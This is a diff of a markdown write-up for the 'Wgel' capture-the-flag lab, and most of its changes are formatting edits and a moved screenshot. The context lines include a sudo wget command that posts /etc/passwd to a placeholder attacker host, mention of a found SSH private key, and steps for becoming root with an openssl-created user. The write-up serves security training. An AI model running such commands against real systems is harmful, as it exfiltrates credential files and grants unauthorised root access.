@@ -45,7 +45,7 @@ TARGET IP: 10.10.120.57
 80 → HTTP
 - Apache httpd 2.4.18
 - There is comment in the apache default web page source code that could perhaps a username.
-- There is a user input in [/sitemap/contact](http://10.10.120.57/sitemap/contact.html)
+- There is a user input in /sitemap/contact
 
 22 → SSH
 - Found id_rsa
@@ -149,7 +149,7 @@ On the target machine
 ```
 sudo /usr/bin/wget --post-file=/etc/passwd <ATTACK_IP>:<PORT>
 ```
-The --post-file flag enables wget to send the content of any file.
+The `--post-file` flag enables wget to send the content of any file.
 
 ![Desktop View](/assets/images/wgel-ctf/wget.png){: width="972" height="589" }
 
@@ -187,6 +187,8 @@ Switch to the created user
 su <USER>
 password1 <-- enter the password you created from openssl
 ```
+![Desktop View](/assets/images/wgel-ctf/root.png){: width="972" height="589" }
+
 > Do not forget to find the FLAGS
 {: .prompt-danger }
 
@@ -196,7 +198,6 @@ password1 <-- enter the password you created from openssl
 
 [Sudo Wget Privilege Escalation Exploit Notes](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-wget-privilege-escalation/)
 
-![Desktop View](/assets/images/wgel-ctf/root.png){: width="972" height="589" }
 
 
 ## **Take Away Concepts**
